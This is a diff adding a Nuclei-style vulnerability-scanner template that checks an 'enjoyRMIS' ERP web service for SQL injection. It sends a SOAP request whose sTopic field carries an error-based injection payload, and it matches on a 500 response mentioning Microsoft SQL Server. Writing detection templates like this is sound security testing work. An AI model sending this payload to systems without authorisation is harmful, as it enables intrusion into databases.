@@ -1,0 +1,31 @@
+id: ag-erp-CWSSurveyDef-sqli
+info:
+  name: ag-erp-CWSSurveyDef-sqli
+  author: lemonlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        POST /enjoyRMIS_WS/WS/BaseInfo/CWSSurveyDef.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 461
+        Connection: close
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <CheckHaveAnswer xmlns="http://tempuri.org/">
+              <sTopic>1' and 1=@@version--+</sTopic>
+            </CheckHaveAnswer>
+          </soap:Body>
+        </soap:Envelope>
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - Microsoft SQL Server
+    matchers-condition: and
